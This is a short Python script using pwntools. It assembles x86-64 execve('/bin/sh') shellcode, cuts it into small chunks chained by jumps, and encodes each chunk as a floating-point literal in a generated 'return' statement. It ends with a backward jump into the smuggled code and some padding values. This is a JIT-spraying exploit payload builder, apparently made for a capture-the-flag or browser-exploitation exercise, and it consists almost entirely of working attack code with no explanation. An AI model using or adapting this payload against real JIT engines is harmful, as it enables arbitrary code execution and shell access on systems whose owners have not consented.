from pwn import *
import struct
context.arch = "amd64"

instructions = [
"mov ebx, 0x0068732f",
"shl rbx, 32",
"mov edx, 0x6e69622f",
"add rbx, rdx",
"push rbx",
"xor eax, eax",
"mov al, 0x3b",
"mov rdi, rsp",
"xor edx, edx",
"xor rsi, rsi",
"syscall"
]

# Marker constant
buf = [b""]
bytecode = [asm(i) for i in instructions]
jmp = asm("jmp $+7")
for i in bytecode:
    if len(buf[-1] + i) > 6:
        buf[-1] = buf[-1].ljust(6, b"\x90") + jmp
        buf.append(i)
    else:
        buf[-1] += i
buf[-1] = buf[-1].ljust(7, b"\x90")+b'\x41' # Prevent our floating point has negative number

for i,v in zip(instructions, bytecode):
    print(i, v)

return_statement = 'return '
for i, n in enumerate(buf):
    if len(n) > 8:
        print(f"ERROR: CHUNK {i} TOO LONG")
        print(disasm(n))
        exit()
    f = struct.unpack("d", n)[0]
    return_statement += f'{f}, '

jmp_backward = struct.unpack("d", b'aaaaa'+asm(f"jmp ${-7-13*(len(buf)-1)-11}")+b'a')[0]
return_statement += f'{jmp_backward}, ' # another backward jump to the starting of our smuggled shellcode
return_statement += '2261634.5098039214,{},[4444],[5555];' # padding
print(return_statement)
